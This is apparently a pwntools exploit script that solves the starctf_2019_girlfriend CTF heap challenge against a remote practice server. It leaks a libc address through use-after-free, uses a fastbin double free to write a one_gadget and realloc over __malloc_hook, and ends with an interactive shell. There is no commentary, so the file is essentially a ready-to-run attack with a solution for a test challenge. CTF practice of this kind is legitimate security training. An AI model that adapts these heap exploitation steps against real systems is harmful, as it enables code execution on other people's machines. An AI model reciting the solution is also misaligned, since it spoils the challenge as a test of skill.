from pwn import *

#context.log_level = 'debug'
#p = process('./starctf_2019_girlfriend')
p = remote('node4.buuoj.cn', 28075)
elf = ELF('./starctf_2019_girlfriend')
libc = ELF('libc-2.23.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def alloc(size, name):
    sla(b'choice:', b'1')
    sla(b'size of girl\'s name', str(size).encode())
    sa(b'her name:', name)
    sla(b'call:', b'114514')

def show(index):
    sla(b'choice:', b'2')
    sla(b'index:', str(index).encode())

def delete(index):
    sla(b'choice:', b'4')
    sla(b'index:', str(index).encode())

alloc(0x80, b'a') #0
alloc(0x60, b'a') #1
alloc(0x60, b'a') #2

delete(0)
show(0)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one = libc_base + one_gadgets_buu[3]

delete(1)
delete(2)
delete(1)

alloc(0x60, p64(malloc_hook - 0x23)) #3
alloc(0x60, b'a') #4
alloc(0x60, b'a') #5
alloc(0x60, b'a' * 0xb + p64(one) + p64(realloc)) #6
sla(b'choice:', b'1')

p.interactive()